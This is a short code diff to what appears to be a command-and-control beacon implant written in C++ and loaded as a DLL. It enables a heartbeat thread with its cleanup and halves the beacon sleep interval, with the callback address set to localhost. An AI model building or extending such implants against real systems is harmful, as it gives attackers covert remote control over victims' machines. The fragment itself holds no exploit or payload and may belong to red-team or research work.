@@ -91,7 +91,7 @@ namespace
 				// 启动心跳线程
 				std::atomic<bool> running{true};
 				c2::HeartbeatCtx hctx{&s, &cfg, &running};
-				//HANDLE ht = (HANDLE)_beginthreadex(nullptr, 0, c2::heartbeat_proc, &hctx, 0, nullptr);
+				HANDLE ht = (HANDLE)_beginthreadex(nullptr, 0, c2::heartbeat_proc, &hctx, 0, nullptr);
 
 				c2::Header h;
 				std::vector<uint8_t> payload;
@@ -146,11 +146,11 @@ namespace
 
 				printf("[-] connection lost, reconnecting...\n");
 				running.store(false);
-				//if (ht)
-				//{
-				//	WaitForSingleObject(ht, 2000);
-				//	CloseHandle(ht);
-				//}
+				if (ht)
+				{
+					WaitForSingleObject(ht, 2000);
+					CloseHandle(ht);
+				}
 				c2::net_close(s.sock);
 			}
 			Sleep(delay * 1000);
@@ -167,7 +167,7 @@ status_t process_beacon(HMODULE hModule)
 {
 	std::string host = "127.0.0.1";
 	uint16_t port = 8080;
-	int sleeptime = 60;
+	int sleeptime = 30;
 
 	c2::AgentConfig cfg;
 	cfg.host = host;
